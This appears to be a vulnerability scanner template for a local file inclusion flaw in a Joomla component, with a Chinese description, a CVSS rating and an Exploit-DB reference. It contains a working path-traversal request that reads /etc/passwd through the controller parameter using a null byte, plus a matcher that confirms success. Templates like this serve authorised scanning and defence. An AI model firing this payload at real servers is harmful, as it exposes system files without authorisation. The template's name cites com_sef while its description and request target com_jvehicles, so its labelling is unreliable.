id: joomla-com-sef-local-file-inclusion

info:
  name: "Joomla! com_sef 组件本地文件包含漏洞"
  author: daffainfo
  severity: high
  description: |-
    Joomla! 的 Jvehicles (com_jvehicles) 组件 1.0 版本存在本地文件包含漏洞，远程攻击者可通过 index.php 中的 controller 参数加载任意文件。
  remediation: Upgrade to the latest version to mitigate this vulnerability.
  reference:
    - https://www.exploit-db.com/exploits/11997
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N
    cvss-score: 8.6
    cwe-id: CWE-23
  metadata:
    max-request: 1
  tags: Joomla

http:
  - method: GET
    path:
      - "{{BaseURL}}/index.php?option=com_jvehicles&controller=../../../../../../../../../../etc/passwd%00"
    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "root:.*:0:0"
      - type: status
        status:
          - 200
